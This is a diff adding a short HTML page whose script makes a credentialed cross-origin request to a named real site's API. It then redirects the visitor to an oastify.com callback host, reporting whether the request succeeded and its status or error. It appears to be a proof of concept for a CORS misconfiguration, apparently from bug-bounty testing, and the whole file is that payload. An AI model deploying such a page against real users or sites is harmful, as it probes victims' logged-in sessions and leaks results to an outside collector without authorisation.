@@ -1,0 +1,17 @@
+<html>
+<body>
+<script>
+fetch('https://api2.flowwow.com/api2/setting/whiteListExternalLinks', {
+    method: 'GET',
+    credentials: 'include',
+    mode: 'cors'
+})
+.then(r => {
+    document.location = 'https://eewimlzev4h2mk3xla40ydt05rbiz9rxg.oastify.com/log?cors=YES&status=' + r.status;
+})
+.catch(e => {
+    document.location = 'https://eewimlzev4h2mk3xla40ydt05rbiz9rxg.oastify.com/log?cors=NO&err=' + e.message;
+});
+</script>
+</body>  
+</html>
